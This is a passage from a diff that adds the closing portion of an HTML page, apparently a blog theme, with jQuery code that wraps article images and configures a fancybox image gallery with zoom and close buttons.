+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
